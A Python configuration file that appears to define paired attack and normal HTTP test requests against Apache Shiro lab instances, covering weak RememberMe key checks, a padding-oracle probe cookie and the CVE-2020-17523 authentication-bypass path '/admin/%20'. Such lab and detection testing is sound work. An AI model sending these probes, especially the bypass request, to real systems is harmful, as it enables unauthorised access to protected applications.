# Shiro-related PoC definitions for the index panel.
import os

host = os.environ.get('HOST', '192.168.0.9')

requests_config = {
    'shiro_1_2_4_attack': {
        'method': 'GET',
        'url': 'http://{}:9970/rememberme/check'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '',
        'name': 'Apache Shiro 1.2.4 RememberMe 弱 Key 检测（CVE-2016-4437）',
        'type': 'attack',
    },
    'shiro_1_2_4_normal': {
        'method': 'POST',
        'url': 'http://{}:9970/login'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'username=admin&password=admin123&rememberMe=true',
        'name': 'Apache Shiro 1.2.4 RememberMe 登录验证',
        'type': 'normal',
    },
    'shiro_1_25_1_42_attack': {
        'method': 'GET',
        'url': 'http://{}:9969/home.jsp'.format(host),
        'headers': {
            'Content-Type': 'application/json',
            'Cookie': 'rememberMe=QUFB'
        },
        'data': '',
        'name': 'Apache Shiro Padding Oracle 差异请求（CVE-2019-12422）',
        'type': 'attack',
    },
    'shiro_1_25_1_42_normal': {
        'method': 'POST',
        'url': 'http://{}:9969/login.jsp'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'username=root&password=secret&rememberMe=true',
        'name': 'Apache Shiro 1.4.1 samples/web 风格登录验证',
        'type': 'normal',
    },
    'shiro_1_8_0_attack': {
        'method': 'GET',
        'url': 'http://{}:9968/rememberme/check'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '',
        'name': 'Apache Shiro 1.8.0 弱 Key 检测',
        'type': 'attack',
    },
    'shiro_1_8_0_normal': {
        'method': 'POST',
        'url': 'http://{}:9968/login'.format(host),
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
        'data': 'username=admin&password=admin123&rememberMe=true',
        'name': 'Apache Shiro 1.8.0 RememberMe 登录验证',
        'type': 'normal',
    },
    'shiro_cve_2020_17523_attack': {
        'method': 'GET',
        'url': 'http://{}:9966/admin/%20'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '',
        'name': 'Apache Shiro 认证绕过（CVE-2020-17523）',
        'type': 'attack',
    },
    'shiro_cve_2020_17523_normal': {
        'method': 'GET',
        'url': 'http://{}:9966/admin/dashboard'.format(host),
        'headers': {'Content-Type': 'application/json'},
        'data': '',
        'name': 'Apache Shiro 认证对照访问',
        'type': 'normal',
    },
}
